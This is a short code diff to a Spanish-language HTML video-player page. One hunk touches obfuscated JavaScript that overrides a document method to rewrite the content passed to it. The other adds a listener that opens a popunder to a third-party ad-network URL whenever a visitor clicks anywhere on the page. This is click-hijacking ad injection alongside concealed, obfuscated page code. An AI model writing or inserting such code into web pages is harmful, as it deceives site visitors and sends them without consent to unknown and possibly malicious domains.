@@ -123,7 +123,7 @@
                     document[K[42]] = function() {
                         let a = new c[K[43]](c[K[44]](K[45])[K[46]](K[47], c[K[44]](K[45])),
                             K[48]);
-                        return arguments[0] = arguments[0][K[37]](a, S),
+                        return arguments[0] = arguments[0][K[37]](a,S),
                             c[K[13]][K[42]][K[49]](window[K[13]], arguments[0])
                     };
                     try {
@@ -211,6 +211,11 @@
         } else {
             document.body.innerHTML = "<h2>Error: No se proporcionó la URL del video.</h2>";
         }
+
+        // Abrir el popunder al hacer clic en cualquier parte de la página
+        document.body.addEventListener('click', function() {
+            window.open("https://toopsoug.net/4/9062472?var={your_source_id}", '_blank', 'noreferrer,noopener');
+        });
     </script>
 
 </body>
